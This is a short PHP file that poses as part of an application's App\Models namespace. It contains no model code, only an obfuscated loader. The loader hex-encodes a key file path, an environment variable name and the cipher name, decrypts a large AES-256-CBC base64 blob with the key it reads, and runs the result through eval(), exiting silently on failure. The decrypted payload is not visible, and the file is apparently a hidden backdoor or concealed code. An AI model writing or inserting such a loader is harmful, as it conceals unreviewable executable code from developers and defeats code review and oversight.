<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('V777jp9FO9xtXqjvAQ/qGg==');
$c=base64_decode(
'2x98ptSuAuth6dAY1pJBYbVJQ8iBEqRL+ikoShupsMwSPeChoBcBWJt9WcXV6GURG6scW7rTYNYM' .
'9b7Anns0OZTaDYuyQi0X1A+3Ck3ftF39sD+DMS5V7KOhlSWMx9kV/cvSvEk1mmbkl0TyTcINdCfW' .
'EWByp7jl3YTmaiTNAPJ8YWc88v1vQTVziHA6TX3aciP5XKsc1JKMQzItw88fNV4TaozMthCSDvcL' .
'/Ioh9RxzS30haWhO4GCCHPE1TUeVpiJB0uMgCrLbugtFNtWtM8vKB9YT6OcEWpxhMWzX4XJsRtOQ' .
'nYsDw/FctMGzNdQr1qifVH57WavxfE7lJtk6AYvAJ7htyI5Bp9nIuC980uZh3LtGjfcHfeYIG7dV' .
'jmme/AZvXbDOJzKh2M7KuuaXwUC1Xem4KMKNlguurBLlhmENc4yjQ8d46Ne1Oh9I22Q5Xughsqob' .
'QqohlkBMHP4HrrgoEhNp+/HRh5vMpx6b5IyzkONqVoNyXBCD3jf+iN9bXx2IRDimf5a8SCnJbL1+' .
'zdZpe66akx2rEpzYH5fK5aUh4MQXMrOwYnW/8irlnNZ/FDsBFDtuG11hnAs7puyL1RhvbXwi9+t0' .
'DhZtssQB7NZi14mRQEhnsRREt5+lmkBQEE6uieI6Le9zr2EPNuoQSXtab9cvMaRCBv5nj6mbORba' .
'/04clP5cboXXE7qoUBJs6VxYPURUXP2YNxi0avKf7UNVbU8hao38V+cL/8rEa+dA22WIjXXQybf7' .
'MJpsafzg0OzAv6yobA1KFRucaQ1sL7U3nziQSBlhfS5KkMltLztLaBWqsrFe0AXhFys+za2KkHW3' .
'c6/I5g7LvdilsYLO4YHV5mR0TFCteTAnCJHRU49+xKapje+TVRiYBQI3eNE66qZ8cQdKyhmwp9fv' .
'HOgyavKIIzs7M/1pN9+60gkOnRHWDER8dqDnbwWoAXAurx3oQHwGDSK6ad1zVzOSRVxc4A=='
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
